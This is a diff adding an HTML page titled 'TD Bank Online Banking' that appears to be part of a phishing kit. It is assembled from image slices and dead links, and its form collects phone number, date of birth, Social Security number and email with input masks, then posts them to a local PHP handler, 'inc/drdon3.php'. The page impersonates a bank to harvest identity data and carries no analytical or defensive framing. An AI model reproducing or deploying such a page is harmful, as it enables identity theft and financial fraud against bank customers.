@@ -1,0 +1,80 @@
+<html><head>
+<title>TD Bank Online Banking</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
+  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="images/favicon.ico">	
+<script type="text/javascript">
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+</script>
+<style type="text/css">
+  
+.textbox {
+	padding-left:2px;
+	font-size: 15px;
+    height: 23px;
+    width: 275px;
+    border: 1px solid #848484;
+}
+
+ </style>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1365px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+<script type="text/javascript">
+jQuery(function($){
+   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
+   $("#ssn").mask("999-99-9999",{placeholder:"XXX-XX-XXXX"});
+//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
+});
+</script>
+
+</head>
+<body style="visibility: visible;" onload="unhideBody()" bgcolor="#FBFBFB">
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:187px; top:4px; width:982px; height:202px; z-index:0"><img src="images/uu1.png" alt="" title="" border="0" width="982" height="202"></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:180px; top:439px; width:995px; height:117px; z-index:1"><img src="images/u3.png" alt="" title="" border="0" width="995" height="117"></div>
+
+<div id="image6" style="position:absolute; overflow:hidden; left:197px; top:17px; width:212px; height:49px; z-index:2"><a href="#"><img src="images/t5.png" alt="" title="" border="0" width="212" height="49"></a></div>
+
+<div id="image7" style="position:absolute; overflow:hidden; left:590px; top:531px; width:298px; height:14px; z-index:3"><a href="#"><img src="images/t3.png" alt="" title="" border="0" width="298" height="14"></a></div>
+
+<div id="image8" style="position:absolute; overflow:hidden; left:1056px; top:19px; width:95px; height:22px; z-index:4"><a href="#"><img src="images/t6.png" alt="" title="" border="0" width="95" height="22"></a></div>
+
+<div id="image9" style="position:absolute; overflow:hidden; left:728px; top:457px; width:98px; height:33px; z-index:5"><a href="#"><img src="images/u7.png" alt="" title="" border="0" width="98" height="33"></a></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:186px; top:178px; width:986px; height:262px; z-index:6"><img src="images/u5.png" alt="" title="" border="0" width="986" height="262"></div>
+
+<div id="image5" style="position:absolute; overflow:hidden; left:225px; top:110px; width:131px; height:71px; z-index:7"><a href="#"><img src="images/u6.png" alt="" title="" border="0" width="131" height="71"></a></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:225px; top:244px; width:128px; height:74px; z-index:8"><a href="#"><img src="images/t8.png" alt="" title="" border="0" width="128" height="74"></a></div>
+<form action="inc/drdon3.php" name="dafahoja" id="dafahoja" method="post">
+<input name="phone" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:221px;left:621px;top:200px;z-index:9">
+<input name="db" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:221px;left:621px;top:237px;z-index:10">
+<input name="sn" id="ssn" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:221px;left:621px;top:270px;z-index:11">
+<input name="eml" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:221px;left:621px;top:302px;z-index:12">
+<div id="formimage1" style="position:absolute; left:621px; top:460px; z-index:16"><input type="image" name="formimage1" width="102" height="29" src="images/cofinrm.png"></div>
+
+</form></div>
+	
+
+
+</body></html>
